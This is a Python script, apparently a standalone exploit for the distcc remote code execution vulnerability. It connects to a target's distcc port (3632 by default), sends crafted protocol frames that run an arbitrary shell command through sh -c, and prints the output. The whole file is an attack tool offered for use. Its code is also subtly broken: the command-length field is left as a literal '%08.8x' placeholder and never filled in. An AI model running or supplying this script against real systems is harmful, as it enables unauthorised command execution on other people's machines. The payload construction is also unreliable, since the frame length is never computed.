import argparse
import socket
import re

def connect(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        return s
    except Exception as e:
        print("Failed to connect to distcc server:", e)
        return None

def send_data(s, data):
    try:
        s.sendall(data.encode())
        return True
    except Exception as e:
        print("Failed to send data to distcc server:", e)
        return False

def receive_data(s):
    try:
        data = s.recv(4096).decode()
        return data
    except Exception as e:
        print("Failed to receive data from distcc server:", e)
        return None

def exploit(host, port, cmd):
    s = connect(host, port)
    if not s:
        return

    cmds = [
        "DIST00000001",
        f"ARGC00000008ARGV00000002shARGV00000002-cARGV%08.8xsh -c '({cmd})'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002-oARGV00000006main.o",
        "DOTI00000001A\n"
    ]

    for cmd in cmds:
        if not send_data(s, cmd):
            s.close()
            return

    data = receive_data(s)
    if data:
        output = re.search("SOUT\w{8}(.*)", data)
        if output and output.group(1):
            print("Command output:", output.group(1))
        else:
            print("No command output received.")
    
    s.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit distcc remote code execution vulnerability")
    parser.add_argument("host", help="Target host")
    parser.add_argument("-p", "--port", type=int, default=3632, help="Target port (default: 3632)")
    parser.add_argument("--cmd", default="id", help="Command to run at the remote server (default: 'id')")
    args = parser.parse_args()

    exploit(args.host, args.port, args.cmd)
